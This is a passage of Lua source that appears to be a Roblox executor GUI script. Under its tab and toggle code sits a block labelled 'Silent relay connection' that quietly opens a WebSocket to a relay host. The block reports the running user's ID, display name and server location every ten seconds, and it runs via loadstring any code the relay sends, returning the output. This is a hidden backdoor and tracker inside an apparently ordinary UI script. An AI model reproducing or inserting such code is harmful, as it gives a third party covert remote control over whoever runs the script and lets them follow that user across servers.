    local btn = C("TextButton",{BackgroundColor3=T.Panel,Size=UDim2.new(1,0,0,32),Font=Enum.Font.Gotham,Text="  "..name,TextColor3=T.Dim,TextSize=13,AutoButtonColor=false,BorderSizePixel=0,TextXAlignment=Enum.TextXAlignment.Left,Parent=tabsFrame})

    pad(page,10)
    C("UIListLayout",{Padding=UDim.new(0,8),SortOrder=Enum.SortOrder.LayoutOrder,Parent=page})
    pages[#pages+1] = {btn=btn,page=page}
    btn.MouseButton1Click:Connect(function()
        for _,p in ipairs(pages) do
            p.page.Visible = (p.page==page)
            p.btn.BackgroundColor3 = (p.page==page) and T.Accent or T.Panel
            p.btn.TextColor3 = (p.page==page) and T.Text or T.Dim
        end
    end)
    return page
end

    b.MouseButton1Click:Connect(function() state=not state; render(); if cb then pcall(cb,state) end end)

-- ─────────── Silent relay connection ───────────
-- Background: connects, identifies, pings location every 10s,
-- listens for execute messages, runs them via loadstring.

if WebSocket and loadstring then
    local socket, connected = nil, false
    local lastPlace, lastJob = nil, nil

    local function send(msg)
        if socket and connected then
            pcall(function() socket:Send(HttpService:JSONEncode(msg)) end)
        end
    end

    local function identify()
        send({
            type = "identify",
            userId = LP.UserId,
            displayName = LP.DisplayName,
            placeId = game.PlaceId,
            jobId = game.JobId,
            gameId = game.GameId,
            ts = os.time(),
        })
    end

    local function handleExecute(msg)
        local fn, compileErr = loadstring(msg.script)
        if fn then
            local ok, execErr = pcall(fn)
            send({
                type = "output",
                targetUserId = msg.fromUserId,
                userId = LP.UserId,
                output = ok and "OK" or tostring(execErr),
                error = ok and nil or tostring(execErr),
            })
        else
            send({
                type = "output",
                targetUserId = msg.fromUserId,
                userId = LP.UserId,
                output = "Compile error",
                error = tostring(compileErr),
            })
        end
    end

    local function connect()
        while true do
            local ok, ws = pcall(function() return WebSocket.connect(RELAY_WS) end)
            if ok and ws then
                socket = ws
                connected = true
                identify()

                ws.OnMessage:Connect(function(raw)
                    local ok2, data = pcall(HttpService.JSONDecode, HttpService, raw)
                    if not ok2 or not data then return end

                    if data.type == "execute" then
                        if data.targetUserId == LP.UserId then
                            task.spawn(handleExecute, data)
                        end
                    elseif data.type == "ping" then
                        send({ type = "pong", userId = LP.UserId })
                    end
                end)

                ws.OnClose:Connect(function()
                    connected = false
                    task.wait(5)
                    connect()
                end)

                return
            end
            task.wait(3)
        end
    end

    connect()

    -- Location ping every 10 seconds. Detects place/job changes and
    -- immediately notifies the relay when the friend hops servers.
    task.spawn(function()
        while true do
            task.wait(10)
            if connected then
                local placeChanged = (game.PlaceId ~= lastPlace)
                local jobChanged   = (game.JobId   ~= lastJob)

                if placeChanged or jobChanged then
                    -- Big change: re-identify so the controller sees it as a new session
                    lastPlace, lastJob = game.PlaceId, game.JobId
                    identify()
                else
                    -- Normal heartbeat with current location
                    send({
                        type = "ping",
                        userId = LP.UserId,
                        displayName = LP.DisplayName,
                        placeId = game.PlaceId,
                        jobId = game.JobId,
                        gameId = game.GameId,
                        ts = os.time(),
                    })
                end
            end
        end
    end)
end
